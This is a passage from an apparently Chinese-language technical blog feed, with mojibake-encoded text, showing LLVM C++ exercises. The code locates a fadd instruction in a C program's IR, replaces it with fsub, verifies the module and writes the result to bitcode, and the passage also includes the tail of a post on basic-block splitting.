class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>oldblk<span class="token operator">-></span><span class="token function">getIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: old cond br : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>old_cond_br<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> new_cond_br <span class="token operator">=</span> <span class="token class-name">BranchInst</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>change_prt<span class="token punctuation">,</span>defaut_prt<span class="token punctuation">,</span>in_fcmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: new cond br : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>new_cond_br<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">ReplaceInstWithInst</span><span class="token punctuation">(</span>old_cond_br<span class="token punctuation">,</span>new_cond_br<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-05-03 14:54:46     * TODO:     * åˆ é™¤åŸå…ˆprintfçš„è°ƒç”¨æŒ‡ä»¤     * */</span>    in_prt<span class="token operator">-></span><span class="token function">eraseFromParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">/**     * #include "llvm/IR/Verifier.h"     * 2022-05-02 11:43:34     * TODO:     * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§     * verifyModule(*M,&amp;errs()): true if the module is broken.      * */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>        <span class="token comment">// M->print(outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * #include "llvm/Bitcode/BitcodeWriter.h"     * 2022-05-03 12:55:33     * TODO:     * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ     * */</span>    std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-6-æ•ˆæœ">2.6 æ•ˆæœ</h3><p><img src="https://s2.loli.net/2022/05/03/7AnUt2oRHsq3Mx1.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/03/7AnUt2oRHsq3Mx1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220503160126584"></p></div><h2 id="ä¸‰-æ€»ç»“">ä¸‰) æ€»ç»“</h2><div class="story post-story"><p>åŸºæœ¬å—æ“ä½œæ¶‰åŠåˆ°ï¼š</p><ol><li><p>å¯¹åŸºæœ¬å—çš„éå†(è¿­ä»£å™¨åº”ç”¨)</p></li><li><p>å¯¹åŸºæœ¬å—çš„æ‹†åˆ†ï¼Œ åŸºæœ¬å—çš„æ‹†åˆ†æ—¶ï¼Œæ ¹æ®æ–¹æ³•çš„ä½¿ç”¨ä¼šå°†å½“å‰æŒ‡ä»¤æ”¾åˆ°æ–°åŸºæœ¬å—æˆ–æ—§åŸºæœ¬å—(æ³¨æ„åŒºåˆ†)</p></li><li><p>æ„é€ æŒ‡ä»¤æ’å…¥(å¯ä»¥ä½¿ç”¨<code>IRbuilder</code>) æ¥æ„é€ åŸºæœ¬æŒ‡ä»¤ä¸å‡½æ•°æˆ–åŸºæœ¬å—</p></li><li><p>æŒ‡ä»¤åˆ é™¤æ“ä½œ</p></li><li><p>ç›¸åº”çš„ä¿®æ”¹åModule éœ€è¦è¿›è¡ŒéªŒè¯</p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM -Learn-Work1</title>
      <link href="/posts/a0b36303/"/>
      <url>/posts/a0b36303/</url>
      
        <content type="html"><![CDATA[<h1>LLVM -Learn-Work1</h1><blockquote><p>@2022-04-27 16:33:55</p><p>@sizaif</p><p><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt=""></p></blockquote><blockquote><p><strong>Work1</strong>ï¼šå°†å…¶æµ®ç‚¹æ•°åŠ æ³•æ”¹ä¸ºå‡æ³•ã€‚(æŒ‡ä»¤æ“ä½œ)</p></blockquote><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//main.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"plz input two numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> size_t bufsize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>bufsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f1 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bufsize<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">double</span> f2 <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">,</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f1<span class="token operator">+</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä¸€-æ€è·¯">ä¸€) æ€è·¯</h2><div class="story post-story"><ol><li><p>ä½¿ç”¨<code>Clang</code>ç”ŸæˆIRæ–‡ä»¶</p><pre class="language-none"><code class="language-none">clang -emit-llvm -S main.c -o main.ll</code></pre></li><li><p>ä»<code>IR</code>æ–‡ä»¶ä¸­è¯»å–åˆ°<code>Moduleç±»</code>ä¸­</p></li><li><p>æ‹¿åˆ°<code>main</code>å‡½æ•°</p></li><li><p>æ‰¾åˆ°<code>fadd</code>æŒ‡ä»¤ï¼Œæ„é€ æ–°çš„<code>fsub</code>æŒ‡ä»¤ï¼Œæ·»åŠ åˆ°å½“å‰<code>fadd</code>æŒ‡ä»¤åï¼Œå¹¶åˆ é™¤<code>fadd</code>æŒ‡ä»¤</p><ol><li><p>æ³•ä¸€:</p><p>é€šè¿‡mainå‡½æ•°æ‹¿åˆ°æ‰€æœ‰çš„<code>BasicBlockList()</code></p><p>éå†æ‰€æœ‰<code>basicblock</code>å—çš„æ‰€æœ‰æŒ‡ä»¤(<code>Instruction</code>) æŸ¥æ‰¾<code>fadd</code> æŒ‡ä»¤</p></li><li><p>æ³•äºŒï¼š</p><p>ä½¿ç”¨æŒ‡ä»¤è¿­ä»£å™¨(<code>inst_iterator</code>),éå†æ‰€æœ‰<code>main</code>å‡½æ•°çš„æŒ‡ä»¤æ‰¾åˆ°<code>fadd</code></p></li></ol></li><li><p>éªŒè¯ä¿®æ”¹åçš„<code>Module</code>ç±»</p></li><li><p>å­˜å…¥åˆ°æ–°çš„<code>IR</code>æ–‡ä»¶ä¸­,æ‰§è¡Œ<code>lli aftermain.bc</code></p></li></ol></div><h2 id="äºŒ-æ‰§è¡Œ">äºŒ) æ‰§è¡Œ</h2><div class="story post-story"><h3 id="2-1-ä»IRæ–‡ä»¶ä¸­è¯»å–åˆ°Moduleç±»ä¸­">2.1) ä»<code>IR</code>æ–‡ä»¶ä¸­è¯»å–åˆ°<code>Moduleç±»</code>ä¸­</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 03:20:02 * ä»IRä¸­è·å–Moduleç±» * */</span>M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// M->print(llvm::outs(),nullptr);</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-2-æ‹¿åˆ°mainå‡½æ•°">2.2) æ‹¿åˆ°<code>main</code>å‡½æ•°</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 03:25:52 * è·å–mainå‡½æ•° * */</span><span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-3-æ‰¾åˆ°faddæŒ‡ä»¤ï¼Œæ„é€ fsubæ›¿æ¢æ‰">2.3) æ‰¾åˆ°<code>fadd</code>æŒ‡ä»¤ï¼Œæ„é€ <code>fsub</code>æ›¿æ¢æ‰</h3><p><strong>æ³•ä¸€ï¼š</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 16:56:34 * æ–¹æ³•ä¸€: é€šè¿‡è·å¾—basicblockå—list è¿›è€Œè·å¾—æŒ‡ä»¤ * éå†æŸ¥è¯¢instæŒ‡ä»¤ï¼Œæ‰¾åˆ°fadd * %19 = load double, double* %4, align 8 * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * */</span><span class="token keyword">auto</span> bkl <span class="token operator">=</span> <span class="token operator">&amp;</span>main_fn<span class="token operator">-></span><span class="token function">getBasicBlockList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> bkl<span class="token operator">-></span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> bkl<span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">auto</span> instl <span class="token operator">=</span> <span class="token operator">&amp;</span>it<span class="token operator">-></span><span class="token function">getInstList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> inst <span class="token operator">=</span> instl<span class="token operator">-></span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> inst <span class="token operator">!=</span> instl<span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>inst<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>inst<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> inst<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> Instruction<span class="token double-colon punctuation">::</span>FAdd <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            new_inst <span class="token operator">=</span> <span class="token class-name">BinaryOperator</span><span class="token double-colon punctuation">::</span><span class="token function">CreateFSub</span><span class="token punctuation">(</span>            inst<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            inst<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            old_inst <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>inst<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>æ³•äºŒï¼š</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-27 15:52:04 * æ–¹æ³•äºŒ: æŒ‡ä»¤è¿­ä»£å™¨éå†æŸ¥æ‰¾ * */</span>Instruction <span class="token operator">*</span>old_inst<span class="token punctuation">,</span><span class="token operator">*</span>new_inst<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        new_inst <span class="token operator">=</span> <span class="token class-name">BinaryOperator</span><span class="token double-colon punctuation">::</span><span class="token function">CreateFSub</span><span class="token punctuation">(</span>        I<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        I<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        old_inst <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 2022-05-02 11:49:30 * #include "llvm/Transforms/Utils/BasicBlockUtils.h" * æŒ‡ä»¤æ›¿æ¢ * */</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span><span class="token string">" new op: "</span><span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>new_inst<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span><span class="token string">" old op: "</span><span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>old_inst <span class="token operator">&lt;&lt;</span> <span class="token string">" \n"</span><span class="token punctuation">;</span><span class="token function">ReplaceInstWithInst</span><span class="token punctuation">(</span>old_inst<span class="token punctuation">,</span>new_inst<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-4-éªŒè¯ä¿®æ”¹åçš„Moduleç±»">2.4) éªŒè¯ä¿®æ”¹åçš„<code>Module</code>ç±»</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * #include "llvm/IR/Verifier.h" * 2022-05-02 11:43:34 * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken.  * å³å¦‚æœéªŒè¯æ­£ç¡®è¿”å›ä¸€ä¸ªfalse, è‹¥å­˜åœ¨é—®é¢˜åˆ™è¿”å›true * */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"verify is ok \n"</span><span class="token punctuation">;</span>    <span class="token comment">// M->print(outs(),nullptr);</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-5-å­˜å…¥åˆ°æ–°çš„IRæ–‡ä»¶ä¸­-æ‰§è¡Œlli-aftermain-ll">2.5) å­˜å…¥åˆ°æ–°çš„<code>IR</code>æ–‡ä»¶ä¸­,æ‰§è¡Œ<code>lli aftermain.ll</code></h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */</span>std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-6-å…¨éƒ¨æºç ">2.6) å…¨éƒ¨æºç </h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 01:02:37 * sizaif *  * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs)  -o main main.cpp * ./main main.ll * lli aftermain.bc * */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/IR/IRBuilder.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/LLVMContext.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Module.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstIterator.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Verifier.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instruction.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/DataLayout.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IRReader/IRReader.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/Debug.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/SourceMgr.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/Support/raw_os_ostream.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/WithColor.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Transforms/Utils/BasicBlockUtils.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Bitcode/BitcodeWriter.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> llvm<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/**     * #include &lt;llvm/IR/IRBuilder.h>     * #include "llvm/IR/LLVMContext.h"     * #include "llvm/IR/Module.h"     * #include "llvm/Support/SourceMgr.h"     * åˆå§‹åŒ–     * */</span>    LLVMContext context<span class="token punctuation">;</span>    IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>    SMDiagnostic Err<span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-04-26 03:20:02     * ä»IRä¸­è·å–Moduleç±»     * */</span>    M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token comment">// M->print(llvm::outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 2022-04-26 03:25:52     * è·å–mainå‡½æ•°     * */</span>    <span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * #include "llvm/IR/InstIterator.h"     * 2022-04-27 15:52:04     * æ–¹æ³•äºŒ: æŒ‡ä»¤è¿­ä»£å™¨éå†æŸ¥æ‰¾,æ‰¾åˆ°faddæŒ‡ä»¤     *      * */</span>        Instruction <span class="token operator">*</span>old_inst<span class="token punctuation">,</span><span class="token operator">*</span>new_inst<span class="token punctuation">;</span>    <span class="token comment">// for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123;</span>    <span class="token comment">//     if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123;</span>    <span class="token comment">//         new_inst = BinaryOperator::CreateFSub(</span>    <span class="token comment">//         I->getOperand(0),</span>    <span class="token comment">//         I->getOperand(1),</span>    <span class="token comment">//         "");</span>    <span class="token comment">//         old_inst = &amp;*I;</span>    <span class="token comment">//     &#125;</span>    <span class="token comment">// &#125;</span>    <span class="token comment">/**     *      * 2022-04-26 16:56:34     * æ–¹æ³•ä¸€: é€šè¿‡è·å¾—basicblockå—list è¿›è€Œè·å¾—æŒ‡ä»¤     * éå†æŸ¥è¯¢instæŒ‡ä»¤ï¼Œæ‰¾åˆ°fadd     * %19 = load double, double* %4, align 8     * %20 = load double, double* %5, align 8     * %21 = fadd double %19, %20     * */</span>    <span class="token keyword">auto</span> bkl <span class="token operator">=</span> <span class="token operator">&amp;</span>main_fn<span class="token operator">-></span><span class="token function">getBasicBlockList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> bkl<span class="token operator">-></span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> bkl<span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">auto</span> instl <span 